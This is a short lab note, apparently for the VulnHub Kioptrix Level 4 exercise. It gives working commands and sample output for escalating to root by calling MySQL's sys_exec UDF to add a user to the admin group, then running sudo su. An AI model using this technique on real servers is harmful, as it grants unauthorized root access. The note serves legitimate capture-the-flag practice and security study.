#1
https://medium.com/@bondo.mike/vulnhub-kioptrix-level-4-bc4184a79eeb

Pre-requistie:
Make sure the "lib_mysqludf_sys.so" is available in the system
John@XXXXX:~$ locate udf
/lib/modules/2.6.24-24-server/kernel/fs/udf
/lib/modules/2.6.24-24-server/kernel/fs/udf/udf.ko
/usr/lib/lib_mysqludf_sys.so

Steps:
1. Login into mysql as root (If the mysql service is running as root and you have the mysql root credentials)
 mysql> mysql -u root
 
2. Go to mysql database and check the sys_exec function is already there
 mysql> select * from mysql.func;

Sample output

 +-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function |
| sys_exec              |   0 | lib_mysqludf_sys.so | function |
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)

3. Now add the user to the admin group using command
mysql> select sys_exec('usermod -a -G admin john');

+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 |
+--------------------------------------+
1 row in set (0.09 sec)

4. Now SSH into the system as John and type sudo su
john@XXXXX$sudo su
[sudo] password for john:
root@XXXXX$id
uid=0(root) gid=0(root) groups=0(root)

#2
https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf?rss
